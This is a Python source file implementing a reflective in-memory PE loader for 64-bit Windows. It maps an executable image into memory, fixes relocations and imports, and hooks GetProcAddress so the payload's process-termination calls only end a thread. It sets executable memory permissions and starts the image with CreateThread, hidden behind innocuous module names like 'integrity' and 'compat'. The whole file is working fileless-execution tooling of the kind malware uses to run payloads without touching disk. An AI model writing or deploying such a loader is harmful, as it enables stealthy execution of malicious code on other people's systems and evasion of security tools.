import sys
import ctypes
import os
import struct
import time

# Global list to keep hooks alive and prevent garbage collection
_hooks = []


def _loading_pipeline(data, kernel, desc):
    base = kernel.VirtualAlloc(
        ctypes.c_void_p(desc["b"]), desc["s"], 0x3000, 0x04,
    )
    fx = False
    if not base or base != desc["b"]:
        base = kernel.VirtualAlloc(None, desc["s"], 0x3000, 0x04)
        fx = True
    
    if not base:
        return
    yield base

    ctypes.memmove(base, data[:desc["h"]], desc["h"])
    for vs, va, rs, rp, ch in desc["c"]:
        if rs > 0 and rp > 0:
            n = min(rs, len(data) - rp)
            if n > 0:
                ctypes.memmove(base + va, data[rp:rp + n], n)
    yield base

    if fx:
        from modules import integrity
        delta = base - desc["b"]
        if not desc["r"] or not desc["z"]:
            kernel.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return
        pos = 0
        while pos < desc["z"]:
            br = integrity.peek(base + desc["r"] + pos, "<I")
            bs = integrity.peek(base + desc["r"] + pos + 4, "<I")
            if bs == 0:
                break
            for j in range((bs - 8) // 2):
                ent = integrity.peek(base + desc["r"] + pos + 8 + j * 2, "<H")
                if ent >> 12 == 10:
                    a = base + br + (ent & 0xFFF)
                    integrity.store(a, "<Q", integrity.peek(a, "<Q") + delta)
            pos += bs
    yield base

    _term_apis = (b"ExitProcess", b"TerminateProcess", b"NtTerminateProcess", b"RtlExitUserProcess")

    if desc["i"]:
        from modules import integrity
        _k32 = kernel.GetModuleHandleA(b"kernel32.dll")
        et = kernel.GetProcAddress(_k32, b"ExitThread")
        _gpa_raw = kernel.GetProcAddress(_k32, b"GetProcAddress")

        _GpaType = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        )
        _real_gpa = _GpaType(_gpa_raw)

        @_GpaType
        def _gpa_hook(hmod, name_or_ord):
            nv = name_or_ord if name_or_ord is not None else 0
            if nv > 0xFFFF:
                try:
                    nm = ctypes.string_at(nv)
                    if nm in _term_apis:
                        return et
                except Exception:
                    pass
            return _real_gpa(hmod, nv)

        _hooks.append(_gpa_hook)
        _gpa_hook_ptr = ctypes.cast(_gpa_hook, ctypes.c_void_p).value

        off = base + desc["i"]
        while True:
            nr = integrity.peek(off + 12, "<I")
            if nr == 0:
                break
            ir = integrity.peek(off, "<I")
            ar = integrity.peek(off + 16, "<I")
            dn = ctypes.string_at(base + nr)
            hm = kernel.LoadLibraryA(dn)
            
            lk = base + (ir if ir else ar)
            ia = base + ar
            while hm:
                tv = integrity.peek(lk, "<Q")
                if tv == 0:
                    break
                if tv & 0x8000000000000000:
                    fa = kernel.GetProcAddress(
                        hm, ctypes.c_void_p(tv & 0xFFFF),
                    )
                else:
                    fn = ctypes.string_at(
                        base + (tv & 0x7FFFFFFFFFFFFFFF) + 2,
                    )
                    if fn in _term_apis and et:
                        fa = et
                    elif fn == b"GetProcAddress" and _gpa_hook_ptr:
                        fa = _gpa_hook_ptr
                    else:
                        fa = kernel.GetProcAddress(hm, fn)
                if fa:
                    integrity.store(ia, "<Q", fa)
                lk += 8
                ia += 8
            off += 20
    yield base

    old = ctypes.c_ulong(0)
    for vs, va, rs, rp, ch in desc["c"]:
        sz = max(vs, rs)
        if sz == 0:
            continue
        hx = bool(ch & 0x20000000)
        hw = bool(ch & 0x80000000)
        pt = (0x40 if hw else 0x20) if hx else (0x04 if hw else 0x02)
        kernel.VirtualProtect(
            ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old),
        )
    yield base

    tid = ctypes.c_ulong(0)
    ht = kernel.CreateThread(
        None, 0, ctypes.c_void_p(base + desc["e"]),
        None, 0, ctypes.byref(tid),
    )
    if not ht:
        return
    
    deadline = time.monotonic() + 240
    while time.monotonic() < deadline:
        if kernel.WaitForSingleObject(ht, 2000) == 0:
            break
    
    kernel.CloseHandle(ht)
    yield True


def execute(data):
    if not data or len(data) < 64:
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        return False
    try:
        from modules import compat, integrity

        k = compat.acquire_kernel()
        if not k:
            return False
        d = integrity.parse_descriptor(data)
        if not d:
            return False
        last = None
        for last in _loading_pipeline(data, k, d):
            pass
        return last is True
    except Exception:
        return False
